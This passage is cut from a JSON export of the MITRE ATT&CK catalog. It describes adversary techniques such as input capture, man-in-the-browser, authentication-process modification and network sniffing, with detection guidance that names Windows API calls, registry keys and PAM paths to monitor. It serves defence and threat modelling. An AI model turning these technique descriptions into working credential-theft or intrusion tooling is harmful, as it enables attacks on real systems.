                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
                "url": "https://attack.mitre.org/techniques/T1056",
                "data_sources": [
                    "Windows Registry: Windows Registry Key Modification",
                    "Driver: Driver Load",
                    "Process: OS API Execution",
                    "Process: Process Creation",
                    "File: File Modification",
                    "Process: Process Metadata"
                ],
                "detection": "Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "root",
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "collection",
                    "credential-access"
                ]
            },
            {
                "id": "T1559",
                "name": "Inter-Process Communication",
                "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms.",
                "url": "https://attack.mitre.org/techniques/T1559",
                "data_sources": [
                    "Module: Module Load",
                    "Process: Process Creation",
                    "Script: Script Execution"
                ],
                "detection": "Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.",
                "permissions": [
                    "Administrator",
                    "User",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1534",
                "name": "Internal Spearphishing",
                "description": "Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.(Citation: Trend Micro When Phishing Starts from the Inside 2017)\n\nAdversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic email login interfaces.\n\nThere have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process.(Citation: Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.(Citation: THE FINANCIAL TIMES LTD 2019.)",
                "url": "https://attack.mitre.org/techniques/T1534",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing attacks.(Citation: Trend Micro When Phishing Starts from the Inside 2017)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1149",
                "name": "LC_MAIN Hijacking",
                "description": "**This technique has been deprecated and should no longer be used.**\n\nAs of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary�s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn�t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",
                "url": "https://attack.mitre.org/techniques/T1149",
                "detection": "Determining the original entry point for a binary is difficult, but checksum and signature verification is very possible. Modifying the LC_MAIN entry point or adding in an additional LC_MAIN entry point invalidates the signature for the file and can be detected. Collect running process information and compare against known applications to look for suspicious behavior.",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "macOS"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1570",
                "name": "Lateral Tool Transfer",
                "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "url": "https://attack.mitre.org/techniques/T1570",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "File: File Creation",
                    "File: File Metadata"
                ],
                "detection": "Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1185",
                "name": "Man in the Browser",
                "description": "Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)\n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)",
                "url": "https://attack.mitre.org/techniques/T1185",
                "data_sources": [
                    "Process: Process Access",
                    "Logon Session: Logon Session Creation"
                ],
                "detection": "This is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications.",
                "permissions": [
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1557",
                "name": "Man-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nAdversaries may leverage the MiTM position to attempt to modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.",
                "url": "https://attack.mitre.org/techniques/T1557",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Flow",
                    "Service: Service Creation",
                    "Windows Registry: Windows Registry Key Modification"
                ],
                "detection": "Monitor network traffic for anomalies associated with known MiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ],
                "tactics": [
                    "credential-access",
                    "collection"
                ]
            },
            {
                "id": "T1036",
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "url": "https://attack.mitre.org/techniques/T1036",
                "data_sources": [
                    "Image: Image Metadata",
                    "Command: Command Execution",
                    "Service: Service Metadata",
                    "Service: Service Creation",
                    "Scheduled Job: Scheduled Job Metadata",
                    "Scheduled Job: Scheduled Job Modification",
                    "File: File Metadata",
                    "Process: Process Metadata",
                    "File: File Modification"
                ],
                "detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE�.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1556",
                "name": "Modify Authentication Process",
                "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
                "url": "https://attack.mitre.org/techniques/T1556",
                "data_sources": [
                    "Logon Session: Logon Session Creation",
                    "Process: OS API Execution",
                    "Process: Process Access",
                    "File: File Modification",
                    "File: File Creation",
                    "Module: Module Load",
                    "Windows Registry: Windows Registry Key Modification"
                ],
                "detection": "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).(Citation: Dell Skeleton) \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory.(Citation: Xorrior Authorization Plugins)\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ],
                "tactics": [
                    "credential-access",
                    "defense-evasion",
                    "persistence"
                ]
            },
            {
                "id": "T1578",
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "url": "https://attack.mitre.org/techniques/T1578",
                "data_sources": [
                    "Instance: Instance Stop",
                    "Instance: Instance Start",
                    "Instance: Instance Creation",
                    "Instance: Instance Modification",
                    "Instance: Instance Deletion",
                    "Snapshot: Snapshot Creation",
                    "Snapshot: Snapshot Modification",
                    "Snapshot: Snapshot Deletion",
                    "Volume: Volume Creation",
                    "Volume: Volume Modification",
                    "Volume: Volume Deletion"
                ],
                "detection": "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "IaaS"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1112",
                "name": "Modify Registry",
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
                "url": "https://attack.mitre.org/techniques/T1112",
                "data_sources": [
                    "Process: Process Creation",
                    "Process: OS API Execution",
                    "Command: Command Execution",
                    "Windows Registry: Windows Registry Key Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "Windows Registry: Windows Registry Key Deletion"
                ],
                "detection": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1601",
                "name": "Modify System Image",
                "description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
                "url": "https://attack.mitre.org/techniques/T1601",
                "data_sources": [
                    "File: File Modification"
                ],
                "detection": "Most embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. \n\nCompare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.  (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)\n\nMany vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Network"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1104",
                "name": "Multi-Stage Channels",
                "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
                "url": "https://attack.mitre.org/techniques/T1104",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation"
                ],
                "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1026",
                "name": "Multiband Communication",
                "description": "**This technique has been deprecated and should no longer be used.**\n\nSome adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",
                "url": "https://attack.mitre.org/techniques/T1026",
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) Correlating alerts between multiple communication channels can further help identify command-and-control behavior.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1106",
                "name": "Native API",
                "description": "Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.",
                "url": "https://attack.mitre.org/techniques/T1106",
                "data_sources": [
                    "Process: OS API Execution",
                    "Module: Module Load"
                ],
                "detection": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows API may involve processes loading/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1599",
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001).  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "url": "https://attack.mitre.org/techniques/T1599",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Consider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.\n\nMonitor the border network device�s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized.",
                "permissions": [
                    "Administrator"
                ],
                "platforms": [
                    "Network"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1498",
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "url": "https://attack.mitre.org/techniques/T1498",
                "data_sources": [
                    "Sensor Health: Host Status",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.",
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1046",
                "name": "Network Service Scanning",
                "description": "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",
                "url": "https://attack.mitre.org/techniques/T1046",
                "data_sources": [
                    "Command: Command Execution",
                    "Cloud Service: Cloud Service Enumeration",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.",
                "permissions": [
                    "Administrator",
                    "SYSTEM",
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1135",
                "name": "Network Share Discovery",
                "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.",
                "url": "https://attack.mitre.org/techniques/T1135",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1040",
                "name": "Network Sniffing",
